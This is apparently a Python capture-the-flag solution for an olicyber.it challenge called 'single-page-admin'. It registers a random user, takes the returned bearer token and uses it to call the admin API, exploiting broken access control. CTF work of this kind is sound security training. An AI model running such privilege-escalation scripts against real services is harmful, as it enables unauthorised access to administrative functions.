import requests
import uuid

username = str(uuid.uuid4())

register_url = "https://single-page-admin.challs.olicyber.it/api/register"
admin_url = "https://single-page-admin.challs.olicyber.it/api/admin"

register_data = {"username": username}
resp = requests.post(register_url, json=register_data)
token = resp.json().get("token")

headers = {"Authorization": f"Bearer {token}"}
admin_resp = requests.post(admin_url, headers=headers)

print(admin_resp.text)
